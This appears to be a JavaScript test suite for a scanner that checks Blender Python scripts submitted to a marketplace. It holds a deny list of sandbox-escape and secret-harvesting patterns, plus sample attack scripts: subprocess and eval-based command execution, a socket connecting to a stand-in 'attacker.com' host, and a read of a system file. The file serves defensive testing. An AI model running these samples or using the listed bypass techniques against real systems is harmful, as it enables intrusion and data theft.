import assert from "node:assert/strict";

console.log("-------------------------------------------------");
console.log("  TEST SUITE: Marketplace Security & Publishing  ");
console.log("-------------------------------------------------");

// Standalone implementation matching lib/marketplace/security-scanner.ts
function scanMarketplaceScript(script, declaredCapabilities = {}) {
  const violations = [];

  const forbiddenPatterns = [
    { pattern: /\beval\s*\(/i, reason: "Forbidden dynamic evaluation eval()" },
    { pattern: /\bexec\s*\(/i, reason: "Forbidden dynamic execution exec()" },
    { pattern: /\bos\.(system|popen|spawn)/i, reason: "Forbidden OS process execution" },
    { pattern: /\bsubprocess\./i, reason: "Forbidden subprocess module invocation" },
    { pattern: /\bshutil\./i, reason: "Forbidden destructive filesystem operations" },
    { pattern: /\bsocket\./i, reason: "Forbidden raw network socket operations" },
    { pattern: /\burllib|requests|http\.client/i, reason: "Forbidden network requests" },
    { pattern: /\bos\.environ/i, reason: "Forbidden environment variable harvesting" },
    { pattern: /__subclasses__|__mro__|__bases__/i, reason: "Forbidden Python object model traversal" },
    { pattern: /getattr\s*\(\s*__builtins__/i, reason: "Forbidden builtins reflection bypass" },
  ];

  for (const { pattern, reason } of forbiddenPatterns) {
    if (pattern.test(script)) {
      violations.push(reason);
    }
  }

  const detectedCapabilities = {
    filesystem: /\bopen\s*\(|pathlib\./i.test(script),
    network: /socket|urllib|requests/i.test(script),
    external_process: /subprocess|popen|system/i.test(script),
    blender_api: /\bbpy\./i.test(script),
    geometry: /\b(mesh|ops\.mesh|bmesh|primitive)\b/i.test(script),
    materials: /\b(materials?|principled_bsdf|shaders?|node_tree)\b/i.test(script),
    modifiers: /\bmodifiers\.new\b/i.test(script),
  };

  if (!declaredCapabilities.filesystem && detectedCapabilities.filesystem) {
    violations.push("Code attempts filesystem operations without declared 'filesystem' capability");
  }

  if (!declaredCapabilities.network && detectedCapabilities.network) {
    violations.push("Code attempts network operations without declared 'network' capability");
  }

  if (!declaredCapabilities.external_process && detectedCapabilities.external_process) {
    violations.push("Code attempts process spawning without declared 'external_process' capability");
  }

  const passed = violations.length === 0;
  return {
    passed,
    score: passed ? 100 : 0,
    violations,
    detectedCapabilities,
  };
}

export async function testMarketplaceSecurity() {
  // 1. Attempt subprocess execution
  const attack1 = `
import bpy, subprocess
subprocess.Popen(["calc.exe"])
bpy.ops.mesh.primitive_cube_add()
`;
  const res1 = scanMarketplaceScript(attack1, { blender_api: true });
  assert.equal(res1.passed, false);
  assert.ok(res1.violations.some((v) => v.includes("subprocess")));
  console.log("  ✓ Blocked malicious subprocess injection");

  // 2. Attempt dynamic eval() bypass
  const attack2 = `
import bpy
eval("__import__('os').system('whoami')")
`;
  const res2 = scanMarketplaceScript(attack2, { blender_api: true });
  assert.equal(res2.passed, false);
  assert.ok(res2.violations.some((v) => v.includes("eval()")));
  console.log("  ✓ Blocked dynamic eval() execution bypass");

  // 3. Attempt network socket exfiltration
  const attack3 = `
import bpy, socket
s = socket.socket()
s.connect(("attacker.com", 80))
`;
  const res3 = scanMarketplaceScript(attack3, { blender_api: true });
  assert.equal(res3.passed, false);
  assert.ok(res3.violations.some((v) => v.includes("network")));
  console.log("  ✓ Blocked raw network socket exfiltration");

  // 4. Attempt undeclared filesystem access
  const attack4 = `
import bpy
f = open("C:/Windows/win.ini", "r")
`;
  const res4 = scanMarketplaceScript(attack4, { filesystem: false, blender_api: true });
  assert.equal(res4.passed, false);
  assert.ok(res4.violations.some((v) => v.includes("filesystem")));
  console.log("  ✓ Blocked undeclared filesystem access");

  // 5. Test legitimate procedural template
  const legitTemplate = `
import bpy

bpy.ops.mesh.primitive_cylinder_add(radius=1.5, depth=3.0)
cyl = bpy.context.active_object
cyl.name = "ParametricColumn"

mat = bpy.data.materials.new(name="MarbleShader")
mat.use_nodes = True
cyl.data.materials.append(mat)

sub = cyl.modifiers.new(name="Bevel", type='BEVEL')
`;
  const resLegit = scanMarketplaceScript(legitTemplate, {
    blender_api: true,
    geometry: true,
    materials: true,
    modifiers: true,
  });
  assert.equal(resLegit.passed, true);
  assert.equal(resLegit.score, 100);
  assert.equal(resLegit.detectedCapabilities.blender_api, true);
  assert.equal(resLegit.detectedCapabilities.geometry, true);
  assert.equal(resLegit.detectedCapabilities.materials, true);
  assert.equal(resLegit.detectedCapabilities.modifiers, true);
  console.log("  ✓ Approved legitimate procedural generator script (Score: 100/100, 0 Violations)");

  console.log("  ✓ Marketplace Security Pipeline tests PASSED!\n");
}

if (process.argv[1]?.endsWith("security_pipeline.test.mjs")) {
  testMarketplaceSecurity();
}
